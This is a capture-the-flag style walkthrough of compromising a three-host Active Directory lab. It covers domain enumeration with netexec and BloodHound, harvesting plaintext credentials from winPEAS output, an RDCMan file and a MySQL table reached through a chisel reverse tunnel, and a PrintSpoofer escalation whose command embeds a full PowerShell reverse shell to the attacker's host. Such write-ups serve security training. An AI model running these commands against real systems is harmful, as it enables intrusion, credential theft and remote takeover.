
For this challenge lab, we are given the subnet of the network. which is 192.168.xx.0/24 and some credentials: 

`Eric.Wallows / EricLikesRunning800`

The machines on the network are: 

```
192.168.146.95
192.168.146.96
192.168.146.97
```

We also know that the credentials we have are valid for `192.168.146.95` , which makes our job a lot easier.

Now, the first thing we want to do is check the route on the network so we can identify the machines that are connected to the network. We have their Ip addresses, but we want to get more information.

![[Checking route.png]]

Our network is connected to the tun0 interface. From the Ip addresses of the machines we were given, we can tell that our network is 192.168.146.0/24

We can now use `netexec` to check if we can communicate with the ip addresses over the network and basically identify the Domain Controller. We'll use `netexec`

```bash
netexec smb 192.168.146.0/24
```

![[netexec to get more info.png]]


```console

If you run into an issue with netexec like this, litteraly do what the error says. You don't have to save the old DB data. You can just remove it, and then the next time you run netexec it will rebuild the DB:

[-] Schema mismatch detected for table 'shares' in protocol 'SMB' 
[-] This is probably because a newer version of nxc is being run on an old DB schema. 
[-] Optionally save the old DB data (`cp /home/kali/.nxc/workspaces/default/smb.db ~/nxc_smb.bak`) 
[-] Then remove the SMB DB (`rm -f /home/kali/.nxc/workspaces/default/smb.db`) and run nxc to initialize the new DB
```


Nice! We got more information on the machines. 

```
192.168.146.95 - SECURE
192.168.146.96 - ERA
192.168.146.97 - DC01 (Domain Controller)
```

We also know the domain name now: `domain:secura.yzx`

We will save the Ip addresses in a file. We can use `nano, gedit, vinano, etc...`
Here we'll use nano
```bash
gedit secura_ips
```

![[gedit ip addresses.png]]

and then we'll save it. Now, instead of running `netexec` against the whole network, we can simply run it against the  ip list to find more information on those specific ip addresses.

```bash
netexec smb secura_ips
```

![[netexec targeted.png]]

The next thing is now to do a full Nmap scan on all of the machines that we have on the list to identify open ports and stuff... 

```bash
nmap -p- -Pn -iL secura_ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt --open
```

We can automate the process with nmapAutomator.sh. The only issue with nmapAutomator is it only takes one Ip at a time, but we can remediate it by running it with a wrapper like this:

```bash
while read -r ip; 
	do /home/kali/Tools/nmapAutomator.sh "$ip" Full </dev/tty 
done < secura_ips
```

We'll let it run and in the meantime we can start Bloodhound to get an overview of the Active Directory.

For this, we can simply use a docker container to run it. Make sure docker is running, if it's not, we can start it like this:

```bash
sudo systemctl start docker # start docker
sudo systemctl status docker # checking docker's status
sudo systemctl enable docker # {optional} if you want docker to start automatically on boot
```

Now we can start bloodhound. It will take a couple of minutes.
```bash
curl -L https://ghst.ly/getbhce -o docker-compose.yml
sudo docker-compose pull && sudo docker-compose up -d
```

That's why it's a good idea to start both the nmap scan and the bloodhound container at the same time. 


After the docker set up is done, we can run this command
```bash
sudo docker-compose logs bloodhound | grep -i passw
```

It displays the logs for our bloodhound container and filters them to only show the lines containing passw. We are using this to find the credentials needed to log in to Bloodhound.

![[docker-compose.png]]

We can access bloodhound in the web browser  by typing `localhost:8080` and using our credentials: 
```
admin / dchztUskVkD8C0lLaXyD5oyNmYTLp7ib
```

![[login to bloodhound.png]]

Next thing we need to do is pull the data from our target so we can ingest it in bloodhound. 

We know that `192.168.146.97` is our domain controller (DC01), also because it has port 88 (kerberos) open

![[nmap proof DC01 is the DC.png]]

We can pull the data from it, like this using our credentials that we have:
```bash
netexec ldap 192.168.146.97 -u eric.wallows -p 'EricLikesRunning800' --bloodhound --collection All --dns-server 192.168.146.97
```

![[pulling the data from the target.png]]


If you get this error while running the command above:
```bash
from bloodhound.ad.authentication import ADAuthentication
ModuleNotFoundError: No module named 'bloodhound'
```

All you need to do is install `bloodhound.py` . This error is appearing it because the bloodhound python package which is needed for the ingestor is missing.

You can install it with:
```bash
sudo apt install bloodhound.py
```

Now that we have the data, we can copy it to the `/tmp` folder so we can easily find it and upload it to bloodhound
```bash
cp /home/kali/.nxc/logs/DC01_192.168.146.97_2026-03-01_102750_bloodhound.zip /tmp 
```

And then upload it in bloodhound. By clicking on the `quick upload` button on the left, selecting our data folder in /tmp and click `upload`:

![[data uploaded to bloodhound.png]]


Here are some manual check we could do without bloodhound.

We can list the domain users for example and check the description field for any credentials:

```bash
netexec ldap 192.168.146.97 -u eric.wallows -p 'EricLikesRunning800' --users
```

![[listing domain users with netexec.png]]

There is nothing under the description field, but we should export the list of users so we have it for later use.
```bash
netexec ldap 192.168.146.97 -u eric.wallows -p 'EricLikesRunning800' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee secura_users
```

This part `fgrep -v '[' | fgrep -vi '-Username-' | awk '{print $5}' | tee secura_users` removes noise from the NetExec output, extracts just the usernames, and saves them to a file for later use.

![[saving users from netexec.png]]

We can list the domain shares:
```bash 
netexec smb 192.168.146.97 -u eric.wallows -p 'EricLikesRunning800' --shares
```

![[listing shares with netexec.png]]

There is a test share, we can connect to it using `smbclient`
```bash
smbclient //192.168.146.97/test -U 'ERIC.WALLOWS'%'EricLikesRunning800'
```

![[connecting to network share.png]]

It looks like it's an empty share. We can also automatically crawl network shares from a target with ManSpider: 

A tip: Every time we get new credentials, we should run it again. New credentials sometimes mean new permission, new access. Also, shares should be the last thing to check if we are completely stuck, but they shouldn't be the first thing.

```bash
manspider --threads 256 192.168.146.0/24 -u eric.wallows -p EricLikesRunning800 -c passw login
```

![[ManSpider in action.png]]


Once our data has been uploaded, we can go and mark our user `eric.wallows` as owned. We can go to the explore tab, and type `eric` in the search bar. Then we can right click on the user and select `add to owned` 

![[adding eric to owned in bloodhound.png]]


Now, we can go to ` </> CYPHER` and under `Saved Queries`, select `All Domain Admins`. This will help us map out all the domain admins.

![[mapping out domain admins with bloodhound.png]]

We only have two: `Administrator` and `Domain Admins`.

Tip: Some interesting queries to run are: Dangerous Privileges, AS-REP Roastable Users, Shortest Paths to domain admins, Kerberos, etc.. 


Anyway, there is nothing going on there. 
Since we have our set of credentials, we can log in to 192.168.146.95

```bash
evil-winrm-py -i 192.168.146.95 -u 'eric.wallows' -p 'EricLikesRunning800'
```

![[Login with initial creds.png]]

Now that we are connected let's see if there is any flag

```bash
Get-ChildItem C:\Users\ -Recurse -Include proof.txt,user.txt,local.txt -File -ErrorAction SilentlyContinue
```

![[Pasted image 20260301164017.png]]

We found `proof.txt` in `C:\Users\Administrator\Desktop`. This is our first flag. 

Now let's upload Winpeas and Lazagne to our target.

```powershell
upload ~/Tools/LaZagne.exe C:\Users\Public\
upload ~/Tools/Winpeas/winPEASany.exe C:\Users\Public\
```
![[Uploaded Winpeas and Lazagne.png]]

Lazagne hasn't found anything. Let's run winPEAS. 
```powershell
 .\winPEASany.exe quiet cmd > C:\Users\Public\winpeas.txt
```

After it's done running, we can download it to our machine.
```powershell
download winpeas.txt .
```

Now we can clean up the file and remove the noise:
```bash
iconv -f utf-16 -t utf-8 winpeas.txt -o winpeas_utf8.txt

sed -r 's/\x1B\[[0-9;]*m//g' winpeas_utf8.txt > winpeas_clean.txt # strip the ANSI color code
```


Then from our terminal, we can read `winpeas.txt` using vim. 
```bash
less winpeas_clean.txt
```

Then we can start to look for credentials in the file by typing `/credentials` and then hitting `Enter`. To navigate between the matches, we can use `n (next) / N (previous)`

![[credentials found Autologon.png]]

We found some credentials. 
```bash
DefaultUsername: administrator
DefaultPassword: Reality2Show4!.?
```

We also found this: ![[winpeas founf rdcman.settings.png]]

Looks like we got a file: RDCMan.settings somewhere and we got the path. Let's check it out
```bash
download C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings .
```

![[Creds in RDCman.setting.png]]

Another set of credentials:
```bash
username: apache
password: New2Era4.!
```

In the file, it's mentioned that the credentials are used to connect to Era.secura.yzx, which is our Host Era. Let's try it out
```bash
evil-winrm-py -i 192.168.179.96 -u apache -p 'New2Era4.!'
```

tip: My ip address has changed since I went out to get something to eat, I had to restart the lab which gave me a new set of Ip. It's the same logic, except from now on, it is 179 instead of 146.
```
192.168.179.95
192.168.179.96
192.168.179.97
```

It doesn't look like there is any flag on this machine. We did, however find that there is a sql database we can access.


We can upload chisel.exe on our target
```bash
upload ~/Tools/chisel.exe C:\.
```

On our attacking machine, we can set up a chisel server with reverse tunneling enabled
```bash
./chisel server -p 8082 --reverse
```

on our target machine, we make it connect back to our attacking machine and request a reverse tunnel so it forwards MySQL port 3306 from the pivot machine (target)  to our attacking machine on port 3306.
```bash
.\chisel.exe client 192.168.45.236:8082 R:3306:127.0.0.1:3306
```

And then from our attacking machine we can now try to connect to the sql database
```bash
mysql -u root -h 127.0.0.1 -P 3306 --skip-ssl
```

Once we are connected we can enumerate the databases
```bash
show databases;
```
![[MadiaDB show databases.png]]

The creds database looks interesting let's check it out and then check the tables inside as well
```bash
use creds;
show tables;
```
![[MariaDB use creds.png]]


There is another `creds` table inside. Let's check what's inside
```bash
SELECT * FROM creds;
```
![[checking creds table.png]]


We got some credentials! Nice. Let's try to connect with the administrator credentials on 192.168.179.96
```bash
evil-winrm-py -i 192.168.179.96 -u administrator -p Almost4There8.?
```

![[connected to 192.168.xx.96 as admin.png]]

Now let's try the credentials for Charlotte on 192.168.169.97
```bash
evil-winrm-py -i 192.168.179.97 -u charlotte -p Game2On4.!
```

![[login as charlotte.png]]

There we get our local flag. 

Now, let's try to get our proof.txt flag. We'll have to escalate our privilege.

Using SharpUp.exe we can check for vulnerabilities. First we upload it on the target and then we run it
```bash
.\SharpUp.exe audit
```

![[Sharpup.exe audit.png]]

It finds the SEImpersonate privilege is enabled. We can use printspoofer to exploit it. First we get our OS version
```bash
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, ReleaseId, CurrentBuildNumber
```
![[Checking windows version.png]]

Okay we can see it's windows 2016. so, printspoofer should get the job done.

We upload printspoofer.exe on our target, then we set up a listener  on our attacking machine 
```bash
 nc -lvnp 2121
```

we can run printspoofer.exe like this
```bash
.\PrintSpoofer.exe -c "powershell.exe -nop -ep bypass -c `$client=New-Object System.Net.Sockets.TCPClient('192.168.45.236',2121);`$s=`$client.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb.Split(`"`r`"`n`");`$sb2[-2];`$sendbyte=([text.encoding]::ASCII).GetBytes(`$sb+'PS>');`$s.Write(`$sendbyte,0,`$sendbyte.Length);`$s.Flush()};`$client.Close()"
```

And boom! We got our shell

![[Shell from Printspoofer.exe.png]]

And this is our last flag!



